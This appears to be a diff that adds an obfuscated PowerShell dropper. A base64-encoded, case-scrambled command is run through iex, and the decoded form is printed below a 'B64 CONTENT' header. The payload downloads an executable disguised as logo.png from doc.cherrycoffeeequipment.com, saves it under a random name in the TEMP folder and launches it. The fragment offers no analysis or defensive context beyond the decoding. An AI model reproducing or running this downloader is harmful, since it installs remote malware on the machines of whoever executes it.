@@ -1,0 +1,7 @@
+iex([SySteM.tEXT.enCOdiNg]::uTf8.GETstrINg([System.CONvErT]::froMBaSe64STRinG('CihOZXctT2JqZWN0IHN5U1RFTS5ORVQuV0VCQ2xJRU50KS5kT1duTG9hRGZpbGUoJ2h0dHA6Ly9kb2MuY2hlcnJ5Y29mZmVlZXF1aXBtZW50LmNvbS9udy9sb2dvLnBuZycsIiRlbnY6VEVNUFxncnRzbmRlYmRnZnN5dGV3cncuZXhlIik7U3RhcnQtUHJvY2VzcyAoIiRlbnY6VEVNUFxncnRzbmRlYmRnZnN5dGV3cncuZXhlIikKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sySTEM.NET.WEBClIENt).dOWnLoaDfile('http://doc.cherrycoffeeequipment.com/nw/logo.png',"$env:TEMP\grtsndebdgfsytewrw.exe");Start-Process ("$env:TEMP\grtsndebdgfsytewrw.exe")
+
